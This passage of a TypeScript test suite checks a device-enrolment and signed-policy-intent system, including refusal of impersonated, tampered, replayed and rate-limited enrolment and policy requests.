        { userId: 'u-mallory', role: 'owner', grants: {} },
        { userId: OWNER_ID, role: 'grantee', grants: {} },
      ] satisfies RelayPrincipal[]) {
        expect(await enrol('enrol_commit', { commit: b.commit.toString('base64url') }, principal))
          .toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
      }
      expect(readTrustStore(devicesFile)?.pending).toEqual([])
    })

    it('adds nothing when a wrong code is typed locally', async () => {
      const b = browser()
      const { enrolId, nonceM } = await commit(b)
      expect(await enrol('enrol_reveal', revealOf(b, enrolId, nonceM))).toMatchObject({ kind: 'enrol_result', payload: { state: 'awaiting_code' } })
      expect(() => approveEnrolment('AAAA-AAAA', devicesFile, MACHINE)).toThrow(/No browser is waiting/)
      expect(readTrustStore(devicesFile)?.credentials.map(c => c.keyId)).toEqual([owner.keyId])
    })

    it('holds at most three undecided requests: a fourth evicts the oldest, which can no longer complete', async () => {
      const browsers = Array.from({ length: MAX_PENDING_ENROLMENTS + 1 }, () => browser())
      const challenges: Array<{ enrolId: string; nonceM: string }> = []
      for (const b of browsers) challenges.push(await commit(b))
      const pending = readTrustStore(devicesFile)?.pending ?? []
      expect(pending.filter(p => !p.outcome)).toHaveLength(MAX_PENDING_ENROLMENTS)
      expect(pending.map(p => p.enrolId)).not.toContain(challenges[0].enrolId)
      const late = await enrol('enrol_reveal', revealOf(browsers[0], challenges[0].enrolId, challenges[0].nonceM))
      expect(late).toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
      expect(String(late.payload.message)).toMatch(/Unknown or expired/)
    })

    // Every commit counts towards the budget, including ones later pushed out
    // unrevealed: a relay can compute the honest browser's code from what it
    // relays, and each commit is one more guess at a nonceM that gives its own
    // key the same code.
    it('bounds commits per window even when they are never revealed', async () => {
      for (let i = 0; i < MAX_ENROLMENTS_PER_WINDOW; i++) {
        expect((await enrol('enrol_commit', { commit: browser().commit.toString('base64url') })).kind).toBe('enrol_challenge')
      }
      expect(await enrol('enrol_commit', { commit: browser().commit.toString('base64url') }))
        .toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
    })
  })

  // --- Remote policy --------------------------------------------------------------

  describe('remote policy intent (enrol_policy)', () => {
    const policyIntent = (policy: string, k: Key = owner, extra: Partial<IntentBody> = {}) =>
      sign(k, { action: POLICY_ACTION, payload: policyPayload(policy), ...extra })

    it('refuses an owner-signed intent that lowers the policy', async () => {
      for (const policy of ['warn', 'off']) {
        const refused = await enrol('enrol_policy', { policy, intent: policyIntent(policy) })
        expect(refused).toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
        expect(readTrustStore(devicesFile)?.policy).toBe('required')
      }
      // Still enforced: an unsigned request is refused.
      expectIntentRefusal(await request({ method: 'GET', path: '/api/repos', principal: OWNER }), 'intent_required')
      expect(local.hits).toEqual([])
    })

    it('accepts an owner-signed raise from warn to required, and refuses unsigned, foreign, tampered or replayed ones', async () => {
      setIntentPolicy('warn', devicesFile, MACHINE)
      const refusedRaise = async (payload: unknown, principal: RelayPrincipal = OWNER) => {
        expect(await enrol('enrol_policy', payload, principal)).toMatchObject({ kind: 'error', payload: { code: 'enrol_refused' } })
        expect(readTrustStore(devicesFile)?.policy).toBe('warn')
      }
      await refusedRaise({ policy: 'required' })
      await refusedRaise({ policy: 'required', intent: policyIntent('required', newKey()) })
      await refusedRaise({ policy: 'required', intent: policyIntent('required', dana) }, danaPrincipal([grant()]))
      await refusedRaise({ policy: 'required', intent: tampered(policyIntent('warn'), { payloadHash: sha(policyPayload('required')) }) })
      // Signed for `warn`, delivered as `required`.
      await refusedRaise({ policy: 'required', intent: policyIntent('warn') })
      await refusedRaise({ policy: 'required', intent: policyIntent('required', owner, { machineId: 'm-other' }) })
      await refusedRaise({ policy: 'required', intent: policyIntent('required', owner, { ts: Date.now() - INTENT_MAX_SKEW_MS - 60_000 }) })

      const intent = policyIntent('required')
      expect(await enrol('enrol_policy', { policy: 'required', intent })).toMatchObject({ kind: 'enrol_result', payload: { state: 'approved' } })
      expect(readTrustStore(devicesFile)?.policy).toBe('required')

      // Lowered again locally; the hub replays the raise it saw.
      setIntentPolicy('warn', devicesFile, MACHINE)
      await refusedRaise({ policy: 'required', intent })
    })
  })
})
